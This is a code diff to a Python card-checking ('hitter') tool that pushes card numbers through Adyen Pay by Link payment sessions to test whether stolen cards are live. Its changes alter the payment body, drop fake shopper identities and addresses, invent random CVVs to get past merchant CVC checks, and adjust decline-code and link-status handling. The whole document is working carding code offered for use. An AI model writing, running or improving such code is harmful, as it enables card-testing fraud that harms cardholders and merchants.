@@ -64,7 +64,7 @@ class AdyenCSE:
 
     def _encrypt_field(self, field_name: str, field_value: str) -> str:
         gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
-        plain = f"{CSE_PREFIX}\n{field_name}:{field_value}\ngenerationtime:{gen}"
+        plain = f"{field_name}:{field_value}\ngenerationtime:{gen}"
         plain_b = plain.encode()
 
         aes_key = os.urandom(32)        # 256-bit
@@ -439,7 +439,6 @@ class AdyenHitter:
                 pass
         return None
 
-    # ── session payment submission ──────────────────────────────────────────
     async def _pay_session(self, session, encrypted: dict,
                            sid: str, sdata: str, ck: str,
                            env: str, att_id: Optional[str] = None,
@@ -447,37 +446,17 @@ class AdyenHitter:
                            ccn_mode: bool = False) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
         origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
-        shopper = _generate_random_shopper()
-        brand = _detect_brand(card_num)
         
-        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}
-        if brand and brand != "scheme":
-            pm["brand"] = brand
+        pm = {"type": "scheme", **encrypted}
 
         body = {
             "sessionData": sdata,
-            "clientStateDataIndicator": True,
             "paymentMethod": pm,
-            "shopperEmail": shopper["email"],
-            "shopperName": {"firstName": shopper["first_name"], "lastName": shopper["last_name"]},
-            "telephoneNumber": shopper["phone"],
-            "billingAddress": {
-                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
-                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
-            },
-            "deliveryAddress": {
-                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
-                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
-            },
+            "clientStateDataIndicator": True,
             "browserInfo": self._browser_info(),
             "channel": "Web",
             "origin": origin,
-            "threeDSRequestorChallengeInd": "02",
         }
-        if ccn_mode:
-            body["recurringProcessingModel"] = "CardOnFile"
-            body["shopperInteraction"] = "Ecommerce"
-            body["storePaymentMethod"] = False
 
         if att_id:
             body["checkoutAttemptId"] = att_id
@@ -839,10 +818,6 @@ class AdyenHitter:
                 "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
             },
         }
-        if ccn_mode:
-            body["recurringProcessingModel"] = "CardOnFile"
-            body["shopperInteraction"] = "Ecommerce"
-            body["storePaymentMethod"] = False
 
         hdr = {
             "Content-Type": "application/json; charset=utf-8",
@@ -924,8 +899,7 @@ class AdyenHitter:
             err_code = str(data.get('errorCode', 'error'))
             result['decline_code'] = err_code
             result['error'] = f"{msg} ({err_code})"
-            if psp and err_code in ('903', '905', '702', '140', '150'):
-                result['is_live'] = True
+            result['is_live'] = False
             return result
 
         result['decline_code'] = rc.lower() if rc else 'unknown'
@@ -989,11 +963,15 @@ class AdyenHitter:
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
 
-                # CSE encrypt — CCN mode: number + expiry only, no CVV
+                # CSE encrypt — CCN mode: attach synthetic CVV to satisfy merchant CVC validation
                 try:
                     cse = AdyenCSE(pk)
-                    enc = cse.encrypt_card_ccn(
-                        card['card'], card['month'], card['year'])
+                    cvv = card.get('cvv')
+                    if not cvv or cvv == '000':
+                        cvv = f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
+                        card['cvv'] = cvv
+                    enc = cse.encrypt_card(
+                        card['card'], card['month'], card['year'], cvv)
                 except Exception as e:
                     result['error'] = f"CSE failed: {e}"
                     result['decline_code'] = 'cse_error'
@@ -1004,8 +982,8 @@ class AdyenHitter:
                 sdata = cfg.get('sessionData')
                 result['pbl_reusable'] = cfg.get('pbl_reusable', True)
 
-                if (not sid or not sdata) and cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']}"
+                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
                     result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
@@ -1123,8 +1101,8 @@ class AdyenHitter:
                 result['pbl_reusable'] = cfg.get('pbl_reusable', True)
 
                 # Only block if sessionId and sessionData could not be generated AND link is explicitly inactive
-                if (not sid or not sdata) and cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']}"
+                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
                     result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
